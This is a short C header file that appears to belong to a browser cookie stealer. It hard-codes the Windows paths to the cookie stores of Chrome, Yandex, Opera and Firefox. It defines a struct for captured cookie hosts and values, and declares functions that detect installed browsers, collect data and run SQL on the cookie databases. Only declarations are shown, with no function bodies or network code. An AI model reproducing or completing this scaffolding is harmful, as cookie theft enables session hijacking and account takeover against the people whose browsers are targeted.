#ifndef CH_PATH
 #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
#endif

#ifndef YA_PATH
 #define YA_PATH "AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
#endif

#ifndef OP_PATH
 #define OP_PATH "AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
#endif

#ifndef FF_PATH
 #define FF_PATH "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
#endif


#ifndef uint8_t
typedef unsigned char
uint8_t;

#endif

#ifndef uint16_t
typedef unsigned short
uint16_t;

#endif

#ifndef uint32_t
typedef unsigned int
uint32_t;

#endif

#ifndef cookies_datatype

typedef struct {
        char    host[100];
        char    value[256];
        uint8_t b_type;
}
cookies_datatype;

#endif

#ifndef browser_prediction

typedef struct {
        char*   user_path;
        uint8_t FF;
        uint8_t CH;
        uint8_t OP;
        uint8_t YA;
    } 
browser_prediction;

#endif


/* Main function prototypes.
*/
void dir_reader(const char* directory, char** files);

uint8_t check_file_in_dir(char* filename, const char* dir);

browser_prediction check_browsers(char* local, char* roaming);

void collect_data(browser_prediction status);

void get_sql(const char* sql_path, uint8_t bt);
